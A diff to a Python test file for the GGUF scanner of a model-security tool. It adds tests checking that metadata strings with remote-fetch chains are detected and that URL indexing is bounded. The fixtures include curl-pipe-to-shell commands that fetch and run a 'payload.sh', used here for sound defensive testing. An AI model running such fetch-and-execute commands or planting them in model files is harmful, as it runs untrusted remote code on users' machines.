@@ -17,6 +17,7 @@ from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.rules import Severity
 from modelaudit.scanners.base import DEFAULT_MAX_FILE_READ_SIZE, INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
 from modelaudit.scanners.gguf_scanner import (
+    _GGUF_REMOTE_URL_POSITION_LIMIT,
     GGUF_DUPLICATE_METADATA_INCONCLUSIVE_REASON,
     GGUF_METADATA_LIMIT_INCONCLUSIVE_REASON,
     GGUF_PARSE_INCONCLUSIVE_REASON,
@@ -1648,6 +1649,29 @@ def test_gguf_metadata_remote_fetch_near_matches_stay_clean(value: str) -> None:
     evidence = GgufScanner._metadata_value_security_evidence("general.description", value)
 
     assert evidence == []
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "curl https://huggingface.co/org/model/resolve/main/payload.sh | xargs sh",
+        "curl https://huggingface.co/org/model/resolve/main/payload.sh | tee /tmp/payload.sh; sh /tmp/payload.sh",
+        'requests.delete("https://huggingface.co/org/model/resolve/main/payload.sh")',
+        'fetch("https://huggingface.co/org/model/resolve/main/payload.sh")',
+    ],
+)
+def test_gguf_metadata_documentation_hf_remote_fetch_chains_still_detected(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("general.description", value)
+
+    assert any(item["evidence_type"] == "remote_fetch" for item in evidence)
+
+
+def test_gguf_metadata_remote_url_position_index_is_bounded() -> None:
+    value = " ".join(f"https://huggingface.co/org/model/{index}" for index in range(2_000))
+
+    positions = GgufScanner._remote_url_positions(value)
+
+    assert len(positions) == _GGUF_REMOTE_URL_POSITION_LIMIT
 
 
 @pytest.mark.parametrize(
